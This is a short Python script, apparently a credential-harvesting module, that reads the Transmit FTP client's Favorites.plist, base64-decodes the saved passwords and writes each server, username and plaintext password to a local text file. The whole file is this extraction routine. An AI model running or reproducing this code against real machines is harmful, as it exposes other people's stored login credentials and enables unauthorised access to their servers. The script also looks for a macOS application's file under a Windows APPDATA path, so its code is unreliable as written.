import os
import base64
import xml.etree.ElementTree as ET

class Password:
    def __init__(self):
        self.sUrl = ""
        self.sUsername = ""
        self.sPassword = ""

path = os.path.join(os.environ['APPDATA'], 'Transmit', 'Favorites.plist')

if not os.path.exists(path):
    print("Transmit password file not found!")
    exit()

passwords = []

try:
    tree = ET.parse(path)
    root = tree.getroot()

    for node in root.findall(".//dict"):
        server = ""
        user = ""
        password = ""

        for i, child in enumerate(node):
            if child.tag == "key" and child.text == "server":
                server = node[i + 1].text
            elif child.tag == "key" and child.text == "username":
                user = node[i + 1].text
            elif child.tag == "key" and child.text == "password":
                password = base64.b64decode(node[i + 1].text).decode("utf-8")

        if server and user and password:
            password_obj = Password()
            password_obj.sUrl = f"ftp://{server}/"
            password_obj.sUsername = user
            password_obj.sPassword = password
            passwords.append(password_obj)

except Exception as ex:
    print(f"Error: {ex}")
    exit()

if not passwords:
    print("No passwords found in Transmit password file!")
    exit()

save_path = "Transmit.txt"
try:
    with open(save_path, "w") as writer:
        for password in passwords:
            writer.write(f"Url: {password.sUrl}\n")
            writer.write(f"Username: {password.sUsername}\n")
            writer.write(f"Password: {password.sPassword}\n\n")
    print(f"Transmit passwords saved to {save_path}")
except Exception as ex:
    print(f"Error saving passwords: {ex}")
    exit()
